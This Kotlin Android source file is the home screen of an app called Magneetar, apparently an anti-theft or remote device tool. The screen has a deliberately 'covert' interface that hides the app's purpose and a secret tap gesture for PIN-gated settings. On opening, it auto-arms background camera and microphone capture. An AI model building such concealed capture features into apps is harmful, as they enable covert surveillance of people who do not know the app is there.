package com.magneetar.app

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

/**
 * Home screen shown after successful setup.
 * Displays minimal covert UI that doesn't reveal the app's true purpose.
 * Access to advanced settings requires PIN authentication.
 */
class HomeActivity : AppCompatActivity() {

    companion object {
        /** User opt-out for remote capture (set false when they disarm). */
        private const val PREF_AUTO_ARM = "capture_auto_arm"
        /** Offline SMS Commands opt-in (shared with SmsCommandReceiver). */
        private const val PREF_SMS_ENABLED = "sms_commands_enabled"
        /** PIN for accessing settings (default: 0000). */
        private const val PREF_APP_PIN = "app_pin"
        private const val DEFAULT_PIN = "0000"
    }

    // Covert mode: minimal UI that doesn't reveal the app's true purpose
    private lateinit var tvStatus: TextView
    private lateinit var tvDeviceId: TextView
    private lateinit var tvLastSync: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_home)

        tvStatus = findViewById(R.id.tv_status)
        tvDeviceId = findViewById(R.id.tv_device_id)
        tvLastSync = findViewById(R.id.tv_last_sync)

        // Covert: tap 5x on status to access settings (with PIN)
        var tapCount = 0
        tvStatus.setOnClickListener {
            tapCount++
            if (tapCount >= 5) {
                tapCount = 0
                promptForPin()
            }
        }

        // Long press also works
        tvStatus.setOnLongClickListener {
            tapCount++
            if (tapCount >= 3) {
                tapCount = 0
                promptForPin()
            }
            true
        }

        updateUI()
    }

    override fun onResume() {
        super.onResume()
        updateUI()
        // Auto-arm remote capture + the audio watch in background.
        // Both MUST start from a foreground context (Android 14+ refuses a
        // background start of a camera|mic FGS); HomeActivity opening is the
        // natural foreground moment. If either fails (permission not fully
        // granted etc.) the re-arm notification path takes over.
        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
        if (prefs.getBoolean(PREF_AUTO_ARM, true)) {
            try {
                val intent = Intent(this, MediaCaptureService::class.java)
                    .setAction(MediaCaptureService.ACTION_ARM)
                ContextCompat.startForegroundService(this, intent)
            } catch (e: Exception) {
                // Best-effort
            }
            try {
                val audioIntent = Intent(this, ArmedAudioService::class.java)
                    .setAction(ArmedAudioService.ACTION_ARM)
                ContextCompat.startForegroundService(this, audioIntent)
            } catch (e: Exception) {
                // Best-effort
            }
        }
    }

    private fun updateUI() {
        // Covert UI — minimal info that doesn't reveal the app's purpose
        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", "") ?: ""
        val lastSync = prefs.getLong("last_sync_time", 0)

        tvStatus.text = "Services Active"
        tvStatus.setTextColor(android.graphics.Color.parseColor("#00FF88"))
        tvDeviceId.text = "${deviceId.take(8)}"
        tvDeviceId.setTextColor(android.graphics.Color.parseColor("#404040"))

        if (lastSync > 0) {
            val timeAgo = formatTimeAgo(lastSync)
            tvLastSync.text = timeAgo
        } else {
            tvLastSync.text = ""
        }
    }

    private fun formatTimeAgo(timestamp: Long): String {
        val diff = System.currentTimeMillis() - timestamp
        return when {
            diff < 60_000 -> "Just now"
            diff < 3_600_000 -> "${diff / 60_000}m ago"
            diff < 86_400_000 -> "${diff / 3_600_000}h ago"
            else -> "${diff / 86_400_000}d ago"
        }
    }

    /**
     * Prompt for PIN before accessing advanced settings.
     * Default PIN is 0000 — user can change it in settings.
     */
    private fun promptForPin() {
        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
        val savedPin = prefs.getString(PREF_APP_PIN, DEFAULT_PIN) ?: DEFAULT_PIN

        val input = android.widget.EditText(this).apply {
            hint = "Enter PIN"
            inputType = android.text.InputType.TYPE_CLASS_NUMBER or
                android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD
            setPadding(64, 32, 64, 32)
            setTextColor(android.graphics.Color.WHITE)
            setHintTextColor(android.graphics.Color.GRAY)
        }

        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("Authentication Required")
            .setMessage("Enter PIN to access settings")
            .setView(input)
            .setPositiveButton("VERIFY") { _, _ ->
                val enteredPin = input.text.toString()
                if (enteredPin == savedPin) {
                    showAdvancedSettings()
                } else {
                    Toast.makeText(this, "Incorrect PIN", Toast.LENGTH_SHORT).show()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun showAdvancedSettings() {
        // Hidden advanced settings - accessible only via PIN
        val hasSms = hasSmsPermission()

        val items = mutableListOf(
            "Open Dashboard",
            "Toggle Remote Capture",
            "Battery Optimization",
            "Auto-start",
            "Change PIN",
            "Show Device Info"
        )

        if (hasSms) {
            items.add(2, "Toggle SMS Commands")
        }

        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("Settings")
            .setItems(items.toTypedArray()) { _, which ->
                when (items[which]) {
                    "Open Dashboard" -> openDashboard()
                    "Toggle Remote Capture" -> toggleCapture()
                    "Toggle SMS Commands" -> toggleSmsCommands()
                    "Battery Optimization" -> requestBatteryOptimization()
                    "Auto-start" -> OEMUtils.openAutoStartSettings(this)
                    "Change PIN" -> promptForNewPin()
                    "Show Device Info" -> showDeviceInfo()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    /**
     * Allow user to change the PIN for accessing settings.
     */
    private fun promptForNewPin() {
        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
        val currentPin = prefs.getString(PREF_APP_PIN, DEFAULT_PIN) ?: DEFAULT_PIN

        val input = android.widget.EditText(this).apply {
            hint = "New PIN (4-6 digits)"
            inputType = android.text.InputType.TYPE_CLASS_NUMBER or
                android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD
            setPadding(64, 32, 64, 32)
            setTextColor(android.graphics.Color.WHITE)
            setHintTextColor(android.graphics.Color.GRAY)
        }

        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("Change PIN")
            .setMessage("Enter new PIN (4-6 digits)")
            .setView(input)
            .setPositiveButton("SAVE") { _, _ ->
                val newPin = input.text.toString()
                if (newPin.length in 4..6) {
                    prefs.edit().putString(PREF_APP_PIN, newPin).apply()
                    Toast.makeText(this, "PIN updated", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "PIN must be 4-6 digits", Toast.LENGTH_SHORT).show()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun showDeviceInfo() {
        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", "") ?: ""
        val deviceKey = prefs.getString("device_key", "") ?: ""
        val adminActive = isDeviceAdminActive()

        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("Device Information")
            .setMessage(
                "Device ID: $deviceId\n" +
                "Pairing Code: ${if (deviceKey.isNotEmpty()) PairingCode.of(deviceKey) else "N/A"}\n" +
                "Device Admin: ${if (adminActive) "Active" else "Inactive"}\n" +
                "Protection: ${if (adminActive) "Active" else "Basic"}"
            )
            .setPositiveButton("OK", null)
            .show()
    }

    /** Arm/disarm remote capture + audio watch and persist the choice. */
    private fun toggleCapture() {
        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
        val currentlyArmed = prefs.getBoolean(PREF_AUTO_ARM, true)
        try {
            val mediaAction = if (currentlyArmed) MediaCaptureService.ACTION_DISARM else MediaCaptureService.ACTION_ARM
            val audioAction = if (currentlyArmed) ArmedAudioService.ACTION_DISARM else ArmedAudioService.ACTION_ARM
            prefs.edit().putBoolean(PREF_AUTO_ARM, !currentlyArmed).apply()
            ContextCompat.startForegroundService(
                this,
                Intent(this, MediaCaptureService::class.java).setAction(mediaAction)
            )
            ContextCompat.startForegroundService(
                this,
                Intent(this, ArmedAudioService::class.java).setAction(audioAction)
            )
            Toast.makeText(
                this,
                if (currentlyArmed) "Remote capture disabled" else "Remote capture enabled",
                Toast.LENGTH_SHORT
            ).show()
        } catch (e: Exception) {
            Toast.makeText(this, "Could not toggle remote capture", Toast.LENGTH_SHORT).show()
        }
    }

    private fun toggleSmsCommands() {
        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
        val currentlyEnabled = prefs.getBoolean(PREF_SMS_ENABLED, false)
        prefs.edit().putBoolean(PREF_SMS_ENABLED, !currentlyEnabled).apply()
        Toast.makeText(
            this,
            if (currentlyEnabled) "Offline SMS commands disabled" else "Offline SMS commands enabled",
            Toast.LENGTH_SHORT
        ).show()
    }

    private fun hasSmsPermission(): Boolean =
        androidx.core.content.ContextCompat.checkSelfPermission(
            this, android.Manifest.permission.RECEIVE_SMS
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED

    private fun openDashboard() {
        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
        val serverUrl = prefs.getString("server_url", "")

        if (serverUrl.isNullOrEmpty()) {
            Toast.makeText(this, "Not connected. Please sign in.", Toast.LENGTH_SHORT).show()
            return
        }

        // The dashboard is a SEPARATE web app from the API server. For the
        // hosted service it lives at https://app.magneetar.me (login page),
        // while server_url is the API endpoint (https://api.magneetar.me).
        // Derive the dashboard URL from the API host:
        //   https://api.<host>  ->  https://app.<host>/login
        // Self-hosted servers that don't follow the api.* pattern fall back
        // to the server URL root so the user still lands somewhere useful.
        val dashboardUrl = try {
            val uri = android.net.Uri.parse(serverUrl)
            val host = uri.host
            if (host != null && host.startsWith("api.")) {
                // Preserve the original scheme (https for hosted, http for self-hosted)
                val scheme = uri.scheme ?: "https"
                "$scheme://app.${host.removePrefix("api.")}/login"
            } else {
                serverUrl
            }
        } catch (e: Exception) {
            serverUrl
        }

        // Open the dashboard in a browser
        try {
            val intent = Intent(Intent.ACTION_VIEW).apply {
                data = android.net.Uri.parse(dashboardUrl)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
        } catch (e: Exception) {
            Toast.makeText(this, "Cannot open browser", Toast.LENGTH_SHORT).show()
        }
    }

    private fun requestBatteryOptimization() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val intent = Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                ).apply {
                    data = android.net.Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Cannot open battery settings", Toast.LENGTH_SHORT).show()
        }
    }

    private fun isDeviceAdminActive(): Boolean {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
                    as android.app.admin.DevicePolicyManager
            dpm.isAdminActive(
                android.content.ComponentName(this, AdminReceiver::class.java)
            )
        } catch (e: Exception) { false }
    }

    private fun activateDeviceAdmin() {
        try {
            val admin = android.content.ComponentName(this, AdminReceiver::class.java)
            val intent = Intent(
                android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN
            ).apply {
                putExtra(
                    android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    admin
                )
                putExtra(
                    android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Required to prevent uninstalling Magneetar without first " +
                    "deactivating it, and for remote lock/wipe."
                )
            }
            startActivity(intent)
        } catch (e: Exception) {
            Toast.makeText(this, "Cannot open device admin settings", Toast.LENGTH_SHORT).show()
        }
    }
}
